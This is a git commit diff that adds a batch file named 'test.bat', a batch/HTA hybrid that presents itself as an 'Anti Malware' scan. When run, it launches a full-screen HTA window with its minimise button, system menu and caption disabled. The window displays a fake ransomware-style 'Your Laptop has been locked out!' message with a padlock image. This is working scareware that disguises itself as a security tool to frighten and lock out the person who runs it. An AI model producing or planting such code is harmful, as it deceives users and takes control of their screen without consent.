315cf5d2126345a4e19c4c00db5e35d69831dc7e
Abhinav <abhinav.ranish@outlook.com>
2021-08-10 12:50:30 +0300

    Add files via upload

---
+++ test.bat
@@ -0,0 +1,49 @@
+<!-- :: Batch Section
+@Echo OFF
+
+Title Anti Malware
+
+echo Scanning. . . .
+
+
+
+REM Block Screen
+cls
+setlocal
+for /F "delims=" %%a in ('mshta.exe "%~F0"') do set "HTA=%%a"
+
+-->
+
+<html>
+    <head>
+        <title>CryptMSG</title>
+    <hta:application id="oBVC" 
+                     applicationname="BSOD"  
+                     version="1.0" 
+                     maximizebutton="no" 
+                     minimizebutton="no" 
+                     sysmenu="no" 
+                     Caption="no" 
+                     windowstate="maximize"/> 
+    <style>
+        #texto2{
+            padding-top: 19%;
+            letter-spacing: 1px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body bgcolor="#8c1d1d" scroll="no">
+    <font face="Lucida Console" size="4" color="white">
+<center><p> - Zoom Hecker - </p></center>
+<div id="texto2">
+    Oops, Your Laptop has been locked out!<br>
+    <br><br>
+    Now you need be careful next time you click on links.<br>
+    <br><br>
+   Github.com/Abhinav-ranish<br>
+    <br><br><br>
+    <img id="imagen" alt="Candado" src="https://i.imgur.com/rytGPFG.png" height="130" width="100">
+</div>
+</body>
+</html>
